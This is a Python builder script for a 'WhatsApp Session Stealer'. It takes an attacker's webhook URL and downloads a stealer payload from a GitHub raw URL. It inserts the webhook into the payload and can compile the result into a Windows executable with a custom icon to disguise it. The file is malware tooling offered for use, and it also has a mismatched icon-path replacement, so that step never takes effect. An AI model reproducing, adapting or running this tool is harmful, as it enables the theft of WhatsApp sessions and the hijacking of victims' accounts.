from colorama import Fore
import time
import os
import shutil
import ctypes
import requests

from pystyle import Colors, Colorate, Write, Center, Box

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("WhatsApp Session Stealer | by xpierroz")

banner = """ 
        ╦ ╦╔═╗       
        ║║║╠═╣       
        ╚╩╝╩ ╩       
╔═╗┌┬┐┌─┐┌─┐┬  ┌─┐┬─┐
╚═╗ │ ├┤ ├─┤│  ├┤ ├┬┘
╚═╝ ┴ └─┘┴ ┴┴─┘└─┘┴└─
"""

def _exit():
    print("\n")
    Write.Print(f"    .$ Exiting program", Colors.green_to_cyan, interval=0.05)
    time.sleep(3)
    quit()

def _compile():
    print("\n")
    line = f'pyinstaller --onefile --icon=Ass/Logo.ico payload.py'
    icox = Write.Input("    .$ Enter icon path (type N for none) -> ", Colors.green_to_blue, interval=0.025)
    if icox == "N":
        line = line.replace("--icon=App/Logo.ico", "")
    else:
        line = line.replace("--icon=App/Logo.ico", f"--icon={icox}")
        
    Write.Print(f"    .$ Compiling to exe ...", Colors.green_to_yellow, interval=0.05)
    os.system('echo off')
    print(Fore.BLACK)   
    os.system(line)
    os.system('cls')
    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))  
    _exit()

def main():
    os.system("cls")
    print("\n") # Formatting stuff
    print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by github.com/xpierroz")))
    print("\n")
    
    wbh_url = Write.Input("    .$ Enter your WebHook url -> ", Colors.green_to_blue, interval=0.025)
    Write.Print(f"    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
    payload = requests.get("https://raw.githubusercontent.com/xpierroz/whatsappstealer/main/payload.py").text
    
    with open("payload.py", "w") as f:
        f.write(payload.replace('WEBHOOK = "xpierroz on top"', f'WEBHOOK = "{wbh_url}"'))
        
    Write.Print(f"    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
    compiling = Write.Input("    .$ Compile to exe [Y/N] -> ", Colors.green_to_blue, interval=0.025)
    if compiling == "Y":
        _compile()
    else:
        _exit()

    
main()
input()